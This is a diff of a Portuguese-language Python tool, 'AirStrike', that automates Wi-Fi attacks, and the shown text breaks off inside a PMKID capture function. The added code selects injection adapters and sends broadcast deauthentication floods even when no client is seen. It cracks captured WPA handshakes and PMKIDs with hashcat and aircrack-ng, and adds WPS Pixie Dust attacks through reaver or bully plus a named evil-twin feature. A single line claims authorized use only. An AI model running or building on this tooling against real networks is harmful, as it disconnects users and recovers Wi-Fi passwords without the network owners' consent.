@@ -4,15 +4,15 @@
 AirStrike: auditoria automatizada de redes Wi-Fi para Kali Linux.
 
 Fluxo completo (aircrack-ng suite + hcxtools + hashcat):
-  1) airmon-ng  -> coloca a interface em modo monitor
+  1) airmon-ng  -> coloca a interface em modo monitor (SEM matar a rede)
   2) airodump-ng -> varre as redes ao alcance e mostra uma tabela
-  3) airodump-ng -> captura pacotes da rede alvo (canal + BSSID)
-  4) aireplay-ng -> teste de desconexão (opcional, para forçar o handshake)
-  5) gzip        -> prepara a lista de senhas (rockyou.txt)
-  6) aircrack-ng -> tenta descobrir a senha a partir do handshake capturado
-  6b) hcxpcapngtool + hashcat -> alternativa PMKID: extrai os hashes no
-       formato 22000 (PMKID/EAPOL) e quebra com hashcat -m 22000
-  7) airmon-ng  -> restaura a interface e o NetworkManager ao final
+  3) airmon-ng  -> mata os processos de rede so na hora da captura
+  4) airodump-ng -> captura pacotes da rede alvo (canal + BSSID)
+  5) aireplay-ng -> teste de desconexão (opcional; pode usar uma 2a antena
+       so para injecao, --iface-inject, estilo wifite)
+  6) airmon-ng  -> para a captura e restaura a interface e a internet
+  7) aircrack-ng / hashcat -> quebra offline do handshake (internet ja de volta)
+       (hcxpcapngtool + hashcat: alternativa PMKID, hashes no formato 22000)
 
 USE APENAS EM REDES PRÓPRIAS OU COM AUTORIZAÇÃO EXPLÍCITA DO RESPONSÁVEL.
 
@@ -28,7 +28,10 @@ import shutil
 import signal
 import subprocess
 import sys
+import tempfile
+import threading
 import time
+import urllib.parse
 
 # ---------------------------------------------------------------------------
 # Constantes
@@ -199,6 +202,38 @@ def list_ifaces_with_type():
     return ifaces
 
 
+def iface_base(nome):
+    """wlan0mon -> wlan0: nome base de uma interface em modo monitor."""
+    if nome and nome.endswith("mon"):
+        return nome[:-3]
+    return nome
+
+
+def chipset_do_iface(nome):
+    """Driver/chipset de uma interface (ex.: 'mt76x2u, MediaTek Inc. MT7612U')."""
+    partes = []
+    try:
+        dev = os.path.realpath(os.path.join("/sys/class/net", nome, "device"))
+        drv = os.path.basename(os.readlink(os.path.join(dev, "driver")))
+        if drv and drv != nome:
+            partes.append(drv)
+        with open(os.path.join(dev, "modalias"), encoding="utf-8") as fh:
+            modalias = fh.read().strip()
+        m = re.search(r"usb:v([0-9A-Fa-f]{4})p([0-9A-Fa-f]{4})", modalias)
+        if m:
+            chave = "%s:%s" % (m.group(1).lower(), m.group(2).lower())
+            rc, out = run(["lsusb"])
+            for linha in out.splitlines():
+                if chave in linha.lower():
+                    descr = linha.split(chave, 1)[1].strip()
+                    if descr:
+                        partes.append(descr)
+                    break
+    except OSError:
+        pass
+    return ", ".join(partes)
+
+
 def find_wireless_iface():
     """Procura uma interface wireless em modo managed (para o modo monitor)."""
     ifaces = list_ifaces_with_type()
@@ -211,11 +246,64 @@ def find_wireless_iface():
     return None
 
 
-def setup_monitor(iface=None, fatal=True):
+def escolher_adaptadores(args):
+    """No estilo wifite: mostra os adaptadores e pergunta qual usar.
+
+    Com um so adaptador (ou sem terminal interativo) nao pergunta nada.
+    Preenche args.iface (captura) e args.iface_inject (injecao/deauth)
+    quando o usuario escolhe.
+    """
+    ifaces = list_ifaces_with_type()
+    if not ifaces:
+        return
+    chips = {n: chipset_do_iface(n) for n in ifaces}
+
+    def rotulo(n):
+        chip = chips.get(n)
+        return f"{n} ({ifaces[n]}, {chip})" if chip else f"{n} ({ifaces[n]})"
+
+    lista = ", ".join(rotulo(n) for n in sorted(ifaces))
+    info(f"adaptadores sem fio detectados: {lista}")
+    nomes = sorted(ifaces)
+    if not sys.stdin.isatty() or len(nomes) < 2:
+        return
+    if not args.iface:
+        try:
+            resp = input(f"Adaptador para CAPTURA (Enter = auto; opcoes: "
+                         f"{', '.join(rotulo(n) for n in nomes)}): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            resp = ""
+        if resp and resp in nomes:
+            args.iface = resp
+        elif resp:
+            warn(f"'{resp}' nao existe; seguindo com auto-deteccao")
+    if not args.iface_inject:
+        base_captura = iface_base(args.iface) if args.iface else None
+        outras = [n for n in nomes if iface_base(n) != base_captura]
+        if not outras:
+            return
+        try:
+            resp = input(f"Adaptador para INJECAO/deauth "
+                         f"(Enter = mesmo da captura; opcoes: "
+                         f"{', '.join(rotulo(n) for n in outras)}): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            resp = ""
+        if resp and resp in nomes:
+            args.iface_inject = resp
+        elif resp:
+            warn(f"'{resp}' nao existe; injecao no mesmo adaptador da captura")
+
+
+def setup_monitor(iface=None, fatal=True, matar_processos=True):
     """Ativa o modo monitor. Devolve (iface_monitor, matou_processos).
 
     Com fatal=False devolve None em vez de encerrar o programa; usado pela
-    recuperacao automatica do adaptador.
+    recuperacao automatica do adaptador. Com matar_processos=False pula o
+    'airmon-ng check kill' (a internet de outras interfaces, como cabo ou
+    USB-tether, segue ativa durante a varredura). Se o monitor nao subir
+    assim, tenta de novo com o 'check kill'.
     """
     if iface is None:
         iface = find_wireless_iface()
@@ -230,8 +318,11 @@ def setup_monitor(iface=None, fatal=True):
         ok(f"{iface} ja esta em modo monitor")
         return iface, False
 
-    info("encerrando processos que conflitam com o modo monitor (airmon-ng check kill)")
-    run(["airmon-ng", "check", "kill"])
+    if matar_processos:
+        info("encerrando processos que conflitam com o modo monitor (airmon-ng check kill)")
+        run(["airmon-ng", "check", "kill"])
+    else:
+        info("subindo o monitor sem matar a rede (sem 'airmon-ng check kill')")
 
     info(f"ativando modo monitor em {iface} (airmon-ng start)")
     rc, out = run(["airmon-ng", "start", iface], timeout=30)
@@ -252,6 +343,12 @@ def setup_monitor(iface=None, fatal=True):
     if ifaces_antes.get(iface) == "monitor":
         return iface, True
 
+    if not matar_processos:
+        # Sem o 'check kill' o NetworkManager pode ter atrapalhado; agora sim
+        # encerra os processos e tenta mais uma vez.
+        warn("monitor nao confirmado sem o 'check kill'; repetindo com ele...")
+        run(["airmon-ng", "check", "kill"])
+        return setup_monitor(iface, fatal=fatal, matar_processos=True)
     if not fatal:
         return None
     err("nao foi possivel confirmar o modo monitor")
@@ -259,21 +356,25 @@ def setup_monitor(iface=None, fatal=True):
     sys.exit(1)
 
 
-def restore_setup(monitor_iface, matou_processos):
-    """Para o modo monitor e restaura o NetworkManager se precisarmos."""
-    if monitor_iface:
+def restore_setup(monitor_ifaces, matou_processos):
+    """Para o(s) modo(s) monitor e restaura o NetworkManager se precisarmos."""
+    if isinstance(monitor_ifaces, str):
+        monitor_ifaces = [monitor_ifaces]
+    monitor_ifaces = [m for m in (monitor_ifaces or []) if m]
+    for monitor_iface in monitor_ifaces:
         info(f"parando modo monitor ({monitor_iface})")
         run(["airmon-ng", "stop", monitor_iface], timeout=30)
     if matou_processos:
         info("restaurando servicos de rede")
         run(["systemctl", "start", "NetworkManager"], timeout=30)
         run(["systemctl", "start", "wpa_supplicant"], timeout=30)
-    # Volta a interface para managed (caso o airmon-ng tenha deixado parada)
+    # Volta as interfaces para managed (caso o airmon-ng tenha deixado parada)
     ifaces = list_ifaces_with_type()
-    base = monitor_iface[:-3] if monitor_iface and monitor_iface.endswith("mon") else monitor_iface
-    if base and ifaces.get(base) != "managed":
-        run(["ip", "link", "set", base, "up"], timeout=15)
-        run(["iw", "dev", base, "set", "type", "managed"], timeout=15)
+    for monitor_iface in monitor_ifaces:
+        base = iface_base(monitor_iface)
+        if base and ifaces.get(base) != "managed":
+            run(["ip", "link", "set", base, "up"], timeout=15)
+            run(["iw", "dev", base, "set", "type", "managed"], timeout=15)
 
 
 class Adapter:
@@ -291,11 +392,23 @@ class Adapter:
         self.matou_processos = False  # se ja matamos NetworkManager etc.
 
     def setup(self):
-        """Ativa o modo monitor na inicializacao."""
-        resultado = setup_monitor(self.preferred, fatal=True)
+        """Ativa o modo monitor na inicializacao sem matar os servicos de rede."""
+        resultado = setup_monitor(self.preferred, fatal=True, matar_processos=False)
         self.monitor, matou = resultado
         self.matou_processos = self.matou_processos or matou
+        self._desconecta_gerenciada()
         return self.monitor
+
+    def _desconecta_gerenciada(self):
+        """Desconecta a interface gerenciada sem parar o NetworkManager.
+
+        Libera a placa para variar de canal na varredura, mas mantem os
+        servicos de rede vivos (internet por cabo/USB-tether segue ativa).
+        """
+        base = iface_base(self.monitor)
+        if not base or list_ifaces_with_type().get(base) != "managed":
+            return
+        run(["nmcli", "dev", "disconnect", base], timeout=15)
 
     def alive(self):
         """True se a interface de monitor ainda existe e esta em modo monitor."""
@@ -522,6 +635,54 @@ def send_deauth(monitor_iface, bssid, count, timeout=15):
     _stop_process(proc)
 
 
+def test_injection(monitor_iface, bssid=None, essid=None, channel=None, timeout=20):
+    """Testa se a placa injeta pacotes (aireplay-ng -9). Devolve bool.
+
+    Sem injecao o deauth nao funciona; avisar antes de gastar minutos de
+    captura a toa.
+    """
+    if channel and str(channel).isdigit():
+        run(["iw", "dev", monitor_iface, "set", "channel", str(channel)])
+    cmd = ["aireplay-ng", "-9"]
+    if essid:
+        cmd += ["-e", essid]
+        if bssid:
+            cmd += ["-a", bssid]
+    cmd.append(monitor_iface)
+    info("testando injecao de pacotes (aireplay-ng -9)...")
+    rc, out = run(cmd, timeout=timeout)
+    if "injection is working" in out.lower():
+        ok("injecao de pacotes confirmada")
+        return True
+    warn("injecao de pacotes NAO confirmada: o deauth pode nao funcionar")
+    warn("  a captura segue mesmo assim (um cliente pode conectar sozinho),")
+    warn("  mas se nao sair handshake, teste outra antena/placa com injecao")
+    return False
+
+
+def setup_injection(args, adapter, channel):
+    """Prepara o adaptador de injecao (estilo wifite: pode ser uma 2a antena).
+
+    Devolve o nome da interface em monitor para o deauth. Se for o mesmo
+    adaptador da captura (ou nao houver/nao subir), devolve o de captura.
+    """
+    captura = adapter.monitor
+    pedido = args.iface_inject
+    if not pedido or iface_base(pedido) == iface_base(captura):
+        return captura
+    info(f"preparando o adaptador de injecao ({pedido})...")
+    resultado = setup_monitor(pedido, fatal=False, matar_processos=False)
+    if not resultado:
+        warn(f"nao consegui subir monitor em {pedido}; injecao sera por {captura}")
+        return captura
+    inj = resultado[0]
+    if iface_base(inj) == iface_base(captura):
+        return captura
+    run(["iw", "dev", inj, "set", "channel", str(channel)])
+    ok(f"deauth/injecao por {inj} (canal {channel}) | captura por {captura}")
+    return inj
+
+
 def _recover_adapter(adapter, cap, bssid, channel, out_dir, log_path):
     """Religa o adaptador e reinicia a captura. Devolve True se conseguiu."""
     warn("o adaptador ou o modo monitor caiu; religando automaticamente...")
@@ -538,7 +699,8 @@ def _recover_adapter(adapter, cap, bssid, channel, out_dir, log_path):
 
 
 def wait_handshake(adapter, cap, bssid, channel, out_dir, log_path,
-                   capture_time, deauth_count, deauth_interval, iv_target):
+                   capture_time, deauth_count, deauth_interval, iv_target,
+                   inject_iface=None):
     """Loop da captura: faz deauth periodico e procura handshake/PMKID.
 
     Vigia o adaptador a cada iteracao: se a placa, o modo monitor ou o
@@ -559,6 +721,7 @@ def wait_handshake(adapter, cap, bssid, channel, out_dir, log_path,
     inicio = time.time()
     ultimo_deauth = 0.0
     ultimo_status = 0.0
+    aviso_sem_cliente = False
 
     info(f"aguardando ate {capture_time}s por {'IVs suficientes (WEP)' if wep else 'handshake/PMKID (WPA)'}... (Ctrl+C para pular)")
     try:
@@ -577,15 +740,21 @@ def wait_handshake(adapter, cap, bssid, channel, out_dir, log_path,
             ivs, clientes = read_capture_stats(cap["prefix"] + "-01.csv", bssid)
 
             if deauth_count > 0 and not wep:
-                if clientes == 0 and elapsed > 20:
-                    # Sem cliente associado o deauth nao adianta; apenas espera
-                    if time.time() - ultimo_status > 15:
-                        warn("nenhum cliente associado ao alvo; aguardando conexao (deauth pausado)")
-                        ultimo_status = time.time()
-                    time.sleep(2)
-                    continue
+                if inject_iface and list_ifaces_with_type().get(inject_iface) != "monitor":
+                    warn(f"adaptador de injecao ({inject_iface}) saiu do monitor; usando {adapter.monitor}")
+                    inject_iface = adapter.monitor
                 if time.time() - ultimo_deauth >= deauth_interval:
-                    send_deauth(adapter.monitor, bssid, deauth_count)
+                    # Deauth broadcast mesmo sem cliente visivel no CSV:
+                    # cliente ocioso (economia de energia) nao aparece na
+                    # lista, mas o deauth (-a BSSID) o alcana do mesmo jeito.
+                    if clientes == 0 and not aviso_sem_cliente:
+                        info("nenhum cliente visivel no CSV; enviando deauth broadcast mesmo assim")
+                        aviso_sem_cliente = True
+                    alvo_inj = inject_iface or adapter.monitor
+                    if alvo_inj != adapter.monitor:
+                        # mantem a antena de injecao no canal do alvo
+                        run(["iw", "dev", alvo_inj, "set", "channel", str(channel)])
+                    send_deauth(alvo_inj, bssid, deauth_count)
                     ultimo_deauth = time.time()
 
             if wep:
@@ -677,19 +846,23 @@ def count_hashes_in_22000(path, bssid=None):
 def extract_22000(cap_file, out_file, bssid=None):
     """Extrai handshakes/PMKID do .cap para o formato hashcat 22000.
 
-    Usa o hcxpcapngtool (hcxtools). Devolve (pmkid, eapol) do AP alvo,
-    ou None se o hcxpcapngtool nao estiver instalado.
+    Usa o hcxpcapngtool (hcxtools). Aceita um .cap ou uma lista deles
+    (o airodump pode ter dividido a sessao em -01.cap, -02.cap, ...).
+    Devolve (pmkid, eapol) do AP alvo, ou None se o hcxpcapngtool nao
+    estiver instalado.
     """
     if not shutil.which("hcxpcapngtool"):
         return None
-    if not os.path.exists(cap_file):
+    entradas = [cap_file] if isinstance(cap_file, str) else list(cap_file)
+    entradas = [e for e in entradas if os.path.exists(e)]
+    if not entradas:
         return (0, 0)
     try:
         if os.path.exists(out_file):
             os.remove(out_file)  # evita acumular hashes de execucoes antigas
     except OSError:
         pass
-    run(["hcxpcapngtool", "-o", out_file, cap_file], timeout=120)
+    run(["hcxpcapngtool", "-o", out_file] + entradas, timeout=120)
     if not os.path.exists(out_file):
         return (0, 0)
     return count_hashes_in_22000(out_file, bssid)
@@ -731,6 +904,7 @@ def crack_hashcat(hash_file, wordlist, extra_args=None, rules=None,
     info(f"testando senhas (hashcat): {' '.join(cmd)}")
     print(paint("-" * 60, Color.CYAN))
 
+    rc, sem_backend = 0, False
     try:
         proc = subprocess.Popen(
             cmd,
@@ -750,7 +924,10 @@ def crack_hashcat(hash_file, wordlist, extra_args=None, rules=None,
                                         "No password hashes", "Backend", "Kernel",
                                         "CUDA", "OpenCL", "INFO")):
                     print(parte)
-        proc.wait()
+                if ("No OpenCL, HIP or CUDA" in p or "clGetPlatformIDs" in p
+                        or "No devices found" in p or "no devices left" in p.lower()):
+                    sem_backend = True
+        rc = proc.wait()
     except KeyboardInterrupt:
         warn("quebra interrompida pelo usuario")
         try:
@@ -759,6 +936,10 @@ def crack_hashcat(hash_file, wordlist, extra_args=None, rules=None,
             pass
 
     print(paint("-" * 60, Color.CYAN))
+
+    if sem_backend and rc != 0:
+        raise RuntimeError("hashcat encerrou sem testar nenhuma senha "
+                           "(sem backend OpenCL/HIP/CUDA)")
 
     chave = None
     if os.path.isfile(out_file):
@@ -969,6 +1150,12 @@ def print_estimate(frentes, hspeed):
     print()
 
 
+def hashcat_sem_backend():
+    """True se o hashcat nao tem plataforma OpenCL/HIP/CUDA (nao testa nada)."""
+    rc, out = run(["hashcat", "-I"], timeout=60)
+    return rc != 0 or "Backend Device ID" not in out
+
+
 def benchmark_speed():
     """Mede a velocidade real do hashcat no modo 22000 (hashcat -b)."""
     if not shutil.which("hashcat"):
@@ -977,6 +1164,9 @@ def benchmark_speed():
     rc, out = run(["hashcat", "-b", "-m", "22000"], timeout=300)
     m = re.search(r"Speed\.#\S*:\s*([\d.]+)\s*([kMG]?H)/s", out)
     if not m:
+        if "No OpenCL" in out or "clGetPlatformIDs" in out:
+            warn("hashcat sem backend OpenCL/GPU; corrija com: "
+                 "sudo apt install pocl-opencl-icd")
         return None
     mult = {"": 1, "k": 1e3, "M": 1e6, "G": 1e9}.get(m.group(2), 1)
     return float(m.group(1)) * mult
@@ -995,6 +1185,11 @@ def crack_pipeline(hash_file, cap_file, wordlist, bssid, cracker, args):
                        and os.path.isfile(hash_file))
     if cracker == "hashcat" and not tem_hashcat:
         warn("hashcat ou hashes 22000 indisponiveis; somente a wordlist sera testada")
+    if tem_hashcat and hashcat_sem_backend():
+        err("hashcat instalado, mas sem backend OpenCL/HIP/CUDA: ele encerra SEM testar senha nenhuma")
+        warn("corrija com:  sudo apt install pocl-opencl-icd   (OpenCL via CPU)")
+        warn("seguindo somente com a wordlist via aircrack-ng; frentes de mascara ficam de fora")
+        tem_hashcat = False
 
     frentes = []
     nome_wl = os.path.basename(wordlist) if wordlist else "(sem wordlist)"
@@ -1029,20 +1224,27 @@ def crack_pipeline(hash_file, cap_file, wordlist, bssid, cracker, args):
     for f in frentes:
         info(f"abrindo frente: {f['nome']}  (Ctrl+C pula para a proxima)")
         chave = None
-        if f["tipo"] == "wordlist":
-            if tem_hashcat:
-                chave = crack_hashcat(hash_file, wordlist,
-                                      shlex.split(args.hashcat_args or ""),
-                                      rules=args.rules)
+        try:
+            if f["tipo"] == "wordlist":
+                if tem_hashcat:
+                    chave = crack_hashcat(hash_file, wordlist,
+                                          shlex.split(args.hashcat_args or ""),
+                                          rules=args.rules)
+                else:
+                    if args.rules:
+                        warn("--rules ignorado: aircrack-ng nao entende regras do hashcat")
+                    chave = crack(cap_file, wordlist, bssid)
             else:
-                if args.rules:
-                    warn("--rules ignorado: aircrack-ng nao entende regras do hashcat")
-                chave = crack(cap_file, wordlist, bssid)
-        else:
-            chave = crack_hashcat(hash_file, None,
-                                  shlex.split(args.hashcat_args or ""),
-                                  mask=f["mask"], custom=f["custom"],
-                                  increment=f["increment"])
+                chave = crack_hashcat(hash_file, None,
+                                      shlex.split(args.hashcat_args or ""),
+                                      mask=f["mask"], custom=f["custom"],
+                                      increment=f["increment"])
+        except RuntimeError as exc:
+            err(f"frente '{f['nome']}' falhou: {exc}")
+            warn("instale um backend e rode de novo:  sudo apt install pocl-opencl-icd")
+            warn("a captura continua salva; a frente NAO foi testada, apenas abortada:")
+            warn(f"  hashcat -m 22000 -a 3 {hash_file} ?d?d?d?d?d?d?d?d")
+            return None
         if chave:
             return chave
         info(f"frente {f['nome']} esgotada")
@@ -1060,6 +1262,257 @@ def save_result(out_dir, bssid, essid, key):
         ok(f"resultado salvo em {path}")
     except OSError as exc:
         warn(f"nao foi possivel salvar o resultado: {exc}")
+
+
+# ---------------------------------------------------------------------------
+# Quebra sobre captura existente (sem nova captura)
+# ---------------------------------------------------------------------------
+
+def list_caps(out_dir):
+    """Sessoes de captura (prefixos *.cap) na pasta de saida, mais recentes antes.
+
+    O airodump pode dividir uma sessao em -01.cap, -02.cap...; agrupa pelo
+    prefixo e devolve o caminho sem o sufixo -NN.cap.
+    """
+    por_prefixo = {}
+    try:
+        nomes = os.listdir(out_dir)
+    except OSError:
+        return []
+    for n in nomes:
+        m = re.match(r"^(.*)-(\d+)\.cap$", n)
+        if not m:
+            continue
+        pref = os.path.join(out_dir, m.group(1))
+        try:
+            quando = os.path.getmtime(os.path.join(out_dir, n))
+        except OSError:
+            continue
+        if pref not in por_prefixo or quando > por_prefixo[pref]:
+            por_prefixo[pref] = quando
+    return sorted(por_prefixo, key=lambda p: por_prefixo[p], reverse=True)
+
+
+def caps_do_prefixo(prefixo):
+    """Arquivos -NN.cap de uma sessao, em ordem (-01.cap, -02.cap, ...)."""
+    pasta = os.path.dirname(prefixo) or "."
+    base = os.path.basename(prefixo)
+    try:
+        nomes = os.listdir(pasta)
+    except OSError:
+        return []
+    pedacos = []
+    for n in nomes:
+        m = re.match(r"^%s-(\d+)\.cap$" % re.escape(base), n)
+        if m:
+            pedacos.append((int(m.group(1)), os.path.join(pasta, n)))
+    return [c for _, c in sorted(pedacos)]
+
+
+def redes_no_cap(cap_files):
+    """Redes vistas na(s) captura(s), pela tabela de redes do aircrack-ng."""
+    rc, out = run(["aircrack-ng"] + list(cap_files), timeout=120)
+    redes = []
+    for line in out.splitlines():
+        m = re.match(r"\s*\d+\s+([0-9A-Fa-f:]{17})\s+(.+?)\s{2,}(\S.*)$", line)
+        if not m:
+            continue
+        enc = m.group(3).strip()
+        handshakes = 0
+        mh = re.search(r"\((\d+)\s+handshake", enc)
+        if mh:
+            handshakes = int(mh.group(1))
+        redes.append({"bssid": m.group(1).upper(), "essid": m.group(2).strip(),
+                      "enc": enc, "handshakes": handshakes})
+    return redes
+
+
+def essid_do_22000(valor):
+    """ESSID do campo do formato 22000.
+
+    hashcat/hcx 7.x gravam o ESSID em hex cru (ex.: 43424e = 'CBN');
+    versoes antigas usavam texto puro ou $HEX[...].
+    """
+    m = re.fullmatch(r"\$HEX\[([0-9A-Fa-f]+)\]", valor)
+    if m:
+        valor = m.group(1)
+    if re.fullmatch(r"[0-9A-Fa-f]+", valor) and len(valor) % 2 == 0:
+        try:
+            texto = bytes.fromhex(valor).decode("utf-8")
+            if texto and all(0x20 <= ord(c) <= 0x7e for c in texto):
+                return texto
+        except ValueError:
+            pass
+    return valor
+
+
+def info_22000(path):
+    """BSSID/ESSID do primeiro hash de um .22000 (WPA*tipo*h*AP*STA*ESSID*...)."""
+    try:
+        with open(path, "r", encoding="utf-8", errors="replace") as fh:
+            for line in fh:
+                campos = line.strip().split("*")
+                if len(campos) < 6 or campos[0] != "WPA":
+                    continue
+                mac = campos[3]
+                bssid = (":".join(mac[i:i + 2] for i in range(0, 12, 2)).upper()
+                         if re.fullmatch(r"[0-9A-Fa-f]{12}", mac) else mac)
+                return bssid, essid_do_22000(campos[5])
+    except OSError:
+        pass
+    return None, None
+
+
+def escolher_captura(caps):
+    """Menu das sessoes de captura; devolve o prefixo escolhido ou None."""
+    pasta = os.path.dirname(caps[0]) or "."
+    print()
+    print(paint("  #   Captura (pasta: %s)" % pasta, Color.CYAN))
+    print("  " + "-" * 58)
+    for i, pref in enumerate(caps, 1):
+        pedacos = caps_do_prefixo(pref)
+        quando = ""
+        if pedacos:
+            quando = time.strftime("%d/%m/%Y %H:%M",
+                                   time.localtime(os.path.getmtime(pedacos[0])))
+        extra = " (%d caps)" % len(pedacos) if len(pedacos) > 1 else ""
+        print("  %-3d %-38s %s%s" % (i, os.path.basename(pref), quando, extra))
+    print("  " + "-" * 58)
+    try:
+        resp = input("Numero da captura (Enter = pular, nova captura): ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return None
+    if resp.isdigit() and 1 <= int(resp) <= len(caps):
+        return caps[int(resp) - 1]
+    return None
+
+
+def escolher_rede_do_cap(cap_files):
+    """Menu das redes dentro da captura; devolve o dict da rede ou None."""
+    redes = redes_no_cap(cap_files)
+    if not redes:
+        err("nenhuma rede reconhecida nessa captura")
+        return None
+    print()
+    print(paint("  #   BSSID              ESSID                      Handshake", Color.CYAN))
+    print("  " + "-" * 58)
+    for i, r in enumerate(redes, 1):
+        hs = "%d handshake" % r["handshakes"] if r["handshakes"] else "--"
+        print("  %-3d %s  %-26s %s" % (i, r["bssid"],
+                                       (r["essid"] or "(oculta)")[:26], hs))
+    print("  " + "-" * 58)
+    try:
+        resp = input("Numero da rede a quebrar (Enter desiste): ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return None
+    if resp.isdigit() and 1 <= int(resp) <= len(redes):
+        return redes[int(resp) - 1]
+    return None
+
+
+def crack_captura_existente(arquivo, args):
+    """Quebra sobre captura ja feita, sem ligar nenhuma antena.
+
+    Aceita o .cap da sessao (ex.: captures/captura_20261015_115942-01.cap),
+    o prefixo da sessao, ou um .22000 direto. Devolve o codigo de saida.
+    """
+    arquivo = os.path.abspath(arquivo)
+    if not os.path.exists(arquivo):
+        err(f"captura nao encontrada: {arquivo}")
+        return 1
+
+    alvo = None
+    if arquivo.lower().endswith(".22000"):
+        prefixo = arquivo[:-6]
+        hash_file = arquivo
+        cap_files = caps_do_prefixo(prefixo)
+        bssid, essid = info_22000(arquivo)
+        if bssid:
+            info(f"hashes de {essid or '?'} [{bssid}] em {arquivo}")
+    else:
+        prefixo = re.sub(r"-\d+\.cap$", "", arquivo, flags=re.IGNORECASE)
+        cap_files = caps_do_prefixo(prefixo) or [arquivo]
+        info(f"lendo {len(cap_files)} arquivo(s) de captura: "
+             f"{', '.join(os.path.basename(c) for c in cap_files)}")
+        alvo = escolher_rede_do_cap(cap_files)
+        if alvo is None:
+            info("nenhuma rede selecionada. Encerrando.")
+            return 0
+        bssid, essid = alvo["bssid"], alvo["essid"]
+        hash_file = prefixo + ".22000"
+
+    if not bssid:
+        err("nao consegui identificar o BSSID do hash/captura")
+        return 1
+    ok(f"alvo: {essid or '(oculta)'} [{bssid}]")
+
+    enc = (alvo or {}).get("enc", "").upper()
+    wordlist = prepare_wordlist(args.wordlist)
+    if wordlist is None:
+        if not sys.stdin.isatty():
+            err("lista de senhas nao encontrada; informe com --wordlist")
+            return 1
+        try:
+            resp = input("Caminho de outra lista de senhas (Enter para abortar): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            resp = ""
+        wordlist = resp if resp and os.path.isfile(resp) else None
+    if wordlist is None:
+        warn("sem lista de senhas; nada foi testado")
+        return 1
+
+    if "WEP" in enc:
+        info("rede WEP: aircrack-ng tenta recuperar a chave direto da captura")
+        chave = crack(cap_files[0], wordlist, bssid)
+        if chave:
+            ok(paint("CHAVE ENCONTRADA: %s" % chave, Color.BOLD + Color.GREEN))
+            save_result(args.out, bssid, essid, chave)
+            return 0
+        warn("chave WEP nao encontrada com esta lista")
+        return 2
+
+    if os.path.isfile(hash_file):
+        pmkid_n, eapol_n = count_hashes_in_22000(hash_file, bssid)
+    else:
+        pmkid_n = eapol_n = 0
+    if not (pmkid_n or eapol_n):
+        extr = extract_22000(cap_files, hash_file, bssid)
+        if extr is None:
+            warn("hcxpcapngtool ausente: extracao PMKID/EAPOL desativada "
+                 "(sudo apt install hcxtools)")
+        else:
+            pmkid_n, eapol_n = extr
+    if pmkid_n or eapol_n:
+        ok(f"hashes prontos: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")
+    else:
+        err("essa captura nao tem handshake nem PMKID dessa rede: sem dados para quebrar")
+        warn("faca uma nova captura (no inicio, responda 'n') com --capture-time maior")
+        return 1
+
+    cracker = args.cracker
+    if cracker == "auto":
+        cracker = "hashcat" if shutil.which("hashcat") else "aircrack"
+    if cracker == "hashcat" and not shutil.which("hashcat"):
+        warn("hashcat ausente; usando aircrack-ng no .cap")
+        cracker = "aircrack"
+    if cracker == "aircrack" and not cap_files:
+        err("sem .cap na pasta para o aircrack-ng; instale o hashcat (sudo apt install hashcat)")
+        return 1
+
+    chave = crack_pipeline(hash_file, cap_files[0] if cap_files else None,
+                           wordlist, bssid, cracker, args)
+    if chave:
+        ok(paint("CHAVE ENCONTRADA: %s" % chave, Color.BOLD + Color.GREEN))
+        save_result(args.out, bssid, essid, chave)
+        return 0
+
+    warn("chave nao encontrada nesta captura. Isso NAO significa que a rede e 'invulneravel':")
+    warn("  - a senha pode nao estar na lista")
+    info("para tentar de novo sem recapturar:")
+    info(f"  sudo airstrike --crack {cap_files[0] if cap_files else hash_file}")
+    return 2
 
 
 # ---------------------------------------------------------------------------
@@ -1125,6 +1578,347 @@ def confirm_authorization(args):
 
 
 # ---------------------------------------------------------------------------
+# Pacote de poder: WPS Pixie Dust, PMKID dedicado e evil twin
+# ---------------------------------------------------------------------------
+
+def wps_probe(mon_iface, bssid, channel, tempo=15):
+    """Detecta o estado WPS do alvo com o wash.
+
+    Devolve 'unlocked', 'locked' ou None (WPS ausente/indeterminado).
+    """
+    if not shutil.which("wash"):
+        return None
+    try:
+        proc = subprocess.Popen(
+            ["wash", "-i", mon_iface, "-c", str(channel), "-s"],
+            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL, encoding="utf-8", errors="replace",
+        )
+        # le por tempo limitado: o wash fica rodando
+        linhas = []
+        def _le():
+            try:
+                for line in proc.stdout:
+                    linhas.append(line)
+            except Exception:
+                pass
+        t = threading.Thread(target=_le, daemon=True)
+        t.start()
+        time.sleep(tempo)
+        proc.kill()
+    except OSError:
+        return None
+    for line in linhas:
+        if bssid.lower() not in line.lower():
+            continue
+        baixo = line.lower()
+        if re.search(r"locked\s*:?\s*no\b", baixo):
+            return "unlocked"
+        if re.search(r"locked\s*:?\s*yes\b", baixo):
+            return "locked"
+        return "unlocked"  # WPS presente sem indicacao de trava
+    return None
+
+
+def wps_pixie(mon_iface, bssid, channel, timeout=90):
+    """Pixie Dust com o reaver (fallback bully). Devolve (pin, senha)."""
+    cmd = ["reaver", "-i", mon_iface, "-b", bssid, "-c", str(channel),
+           "-K", "1", "-vv"]
+    ferramenta = "reaver"
+    if not shutil.which("reaver"):
+        if not shutil.which("bully"):
+            warn("reaver e bully ausentes: WPS Pixie Dust indisponivel "
+                 "(sudo apt install reaver)")
+            return (None, None)
+        cmd = ["bully", "-b", bssid, "-c", str(channel), "-d", mon_iface]
+        ferramenta = "bully"
+    info(f"pixie dust via {ferramenta}: {' '.join(cmd)} (ate {timeout}s)")
+    try:
+        rc, out = run(cmd, timeout=timeout)
+    except (subprocess.TimeoutExpired, OSError):
+        return (None, None)
+    mpin = re.search(r"WPS PIN:\s*'(\d{4,8})'", out) or \
+           re.search(r"Pin is '(\d{4,8})'", out, re.I)
+    mpsk = re.search(r"WPA PSK:\s*'(.+?)'", out) or \
+           re.search(r"key:?\s*=\s*(\S+)", out, re.I)
+    return (mpin.group(1) if mpin else None, mpsk.group(1) if mpsk else None)
+
+
+def pmkid_dedicado(mon_iface, bssid, channel, timeout, out_prefix):
+    """PMKID/EAPOL com o hcxdumptool no canal do alvo (sem deauth, sem cliente).
+
+    Devolve (pmkid, eapol) contados do .22000 gerado; (0, 0) se nada saiu.
+    """
+    if not shutil.which("hcxdumptool"):
